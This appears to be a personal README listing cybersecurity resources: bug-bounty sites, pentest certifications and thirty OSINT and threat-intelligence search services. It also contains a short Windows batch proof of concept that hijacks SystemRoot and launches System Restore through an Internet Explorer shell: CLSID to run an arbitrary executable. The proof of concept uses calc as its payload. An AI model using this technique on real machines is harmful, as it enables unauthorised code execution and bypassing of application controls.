# RandomCyberStuff


## Bug Hunting sites

 - Pentesterlab: https://pentesterlab.com/
 - hackthebox: https://www.hackthebox.com/
 
 ## Bug reports
 
- Hacker One: https://Hackerone.com/hacktivity
- Bug Croud: https://bugcroud.com/crowdstream
- Pen tester Land: https://pentester.land

 ## Website resource
 
 - Any.run: https://any.run/
 allows anyone to register an account and to interactively analyze a particular file in real time

## Certs

### PNPT Practical Network Penetration Tester Certification
- https://certifications.tcm-sec.com/pnpt/

### eCPPT - eLearnSecurity Certified Professional Penetration Tester
- [eLearnSecurity Certified Professional Penetration Tester](https://elearnsecurity.com/product/ecpptv2-certification/)


## IE running code
IE navigating to `shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}` you can spawn System restore. If you modify the `SystemRoot` enviroment variable and copy over DLLs you run them.


POC: 
mkdir %temp%\System32
FOR /R C:\Windows\System32\ %F IN (*.dll) DO COPY "%F" %temp%\System32\ /Y >NUL
set a=C:\Windows\System32\calc.exe
copy %a% %temp%\System32\rstrui.exe /Y > NUL
set SystemRoot=%temp%
start iexplore shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}

## Search resources 

1. DeHashed—View leaked credentials.
2. SecurityTrails—Extensive DNS data.
3. DorkSearch—Really fast Google dorking.
4. ExploitDB—Archive of various exploits.
5. ZoomEye—Gather information about targets.
6. Pulsedive—Search for threat intelligence.
7. GrayHatWarfare—Search public S3 buckets.
8. PolySwarm—Scan files and URLs for threats.
9. Fofa—Search for various threat intelligence.
10. LeakIX—Search publicly indexed information.
11. DNSDumpster—Search for DNS records quickly.
12. FullHunt—Search and discovery attack surfaces.
13. AlienVault—Extensive threat intelligence feed.
14. ONYPHE—Collects cyber-threat intelligence data.
15. Grep App—Search across a half million git repos.
16. URL Scan—Free service to scan and analyse websites.
17. Vulners—Search vulnerabilities in a large database.
18. WayBackMachine—View content from deleted websites.
19. Shodan—Search for devices connected to the internet.
20. Netlas—Search and monitor internet connected assets.
21. CRT sh—Search for certs that have been logged by CT.
22. Wigle—Database of wireless networks, with statistics.
23. PublicWWW—Marketing and affiliate marketing research.
24. Binary Edge—Scans the internet for threat intelligence.
25. GreyNoise—Search for devices connected to the internet.
26. Hunter—Search for email addresses belonging to a website.
27. Censys—Assessing attack surface for internet connected devices.
28. IntelligenceX—Search Tor, I2P, data leaks, domains, and emails.
29. Packet Storm Security—Browse latest vulnerabilities and exploits.
30. SearchCode—Search 75 billion lines of code from 40 million projects.
